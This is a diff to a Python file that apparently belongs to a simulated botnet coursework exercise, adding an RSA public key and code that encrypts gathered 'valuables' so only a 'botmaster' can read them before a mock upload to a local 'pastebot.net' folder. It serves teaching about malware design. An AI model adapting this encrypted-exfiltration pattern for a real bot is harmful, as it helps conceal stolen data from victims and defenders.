@@ -1,11 +1,16 @@
 import os
 
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5
+
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
 # Valuable data to be sent to the botmaster
 valuables = []
 
+# Public RSA key for encryption of data
+encryption_key = b'-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2mzZeA2+fsjCGoTjRFuU\nivZifvfMPHOmMaT6p8lRjxLlRegd6TzYclEtADqxw5Nch4SueWeHKIq+YmZINnUA\nyLGQGZDKaara+ifySkdcjhQq0KXpOcDhTMSHwnDiuGR29snLhvex3fGYjARBZAxk\nvaSvR1EZqveDkTI68n9d5h+5HHTJq8+nIntOgIvLkjCUo5zcOTY9N2PmgV7hBsQ7\nAV0AXlIRRXFgw/3FKeF1ewKydBpCOAPD6iieY5qPw7FXyh1w7/8bKnbO/sndsq8W\nTni28TnlpIZ/Fr3jgGFQqMJhY97L/KxNumcZd5GoVy4pfmk79cn3w/aozEX8NbQ5\nVUkETUQsjAK8POBwJpRRjgseHRYui0hFTIr4gOfBJ8yyJPzEPz4mn2M2YjSDhqOL\nQrNnsLn7TUmZTEyRxcaJKDdQgTtcTzrwP6PsOKIyxO7KKfrX6fXJPOT19apK2kNS\nUDCCOH3xao9QqWUeHTnhhZiGErrQL6TVN+QIQ2jLIK+Bxe6z4Jd7dykiM0lrev0W\nW60tjvd0IKwQSwvkQoYZi7qAgZ+3Mksl17Y24huw8NVvmOFJLxCINVJop1fG7PKr\nuHCS2s04DIq5jw8icWGJYsED6Wzr8ddgmofYcYAbe7YVKrPRAZ96NducfdoSQKjI\nHXiSymmlKNflAOyD6cjnb+cCAwEAAQ==\n-----END PUBLIC KEY-----'
 ###
 
 def save_valuable(data):
@@ -13,14 +18,16 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    return data
+    key = RSA.importKey(encryption_key)
+    cipher = PKCS1_v1_5.new(key)
+    encrypted_data = cipher.encrypt(data)
+    return encrypted_data
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
     valuable_data = "\n".join(valuables)
     valuable_data = bytes(valuable_data, "ascii")
     encrypted_master = encrypt_for_master(valuable_data)
-
     # "Upload" it to pastebot (i.e. save in pastebot folder)
     f = open(os.path.join("pastebot.net", fn), "wb")
     f.write(encrypted_master)
@@ -85,3 +92,4 @@ def run_file(f):
     # If the file can be run,
     # run the commands
     pass
+
